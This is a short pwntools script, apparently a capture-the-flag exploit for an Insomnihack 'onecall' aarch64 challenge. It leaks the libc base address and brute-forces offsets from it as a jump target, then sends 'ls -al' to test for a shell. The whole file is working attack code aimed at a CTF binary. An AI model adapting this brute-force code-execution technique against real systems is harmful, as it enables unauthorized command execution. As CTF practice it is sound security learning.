from pwn import *
 
#r = remote("onecall.teaser.insomnihack.ch", 1337)
#616
for i in range (0x9b958, 1000000):
	#i = int("3d714", 16)
	r = process("./qemu-aarch64 -nx -L ./ ./onecall", shell=True)
	 
	libcbase = 0
	while True:
	    line = r.readline()
	    if "lib/libc.so.6" in line:
	        libcbase = int(line[0:16], 16)
	        break
	 
	elf = ELF("lib/libc.so.6")
	 
	#for symbol in sorted(elf.symbols):
	#    print symbol
	 
	sleep = i#elf.symbols["usleep"]
	execve = elf.symbols["execve"]
	 
	if i % 20 == 0:
	    print "i = " + hex(i)
	print i
	print hex(i)
	print hex(libcbase)
	r.sendline(p64(i+libcbase))
	r.sendline("ls -al")
	r.interactive()
	
	rv = r.recvall()
	if "Illegal instruction" in rv or "Segmentation fault" in rv:
	    continue
	else:
	    print "dla i=" + str(i)
	    print rv
	    #r.interactive()
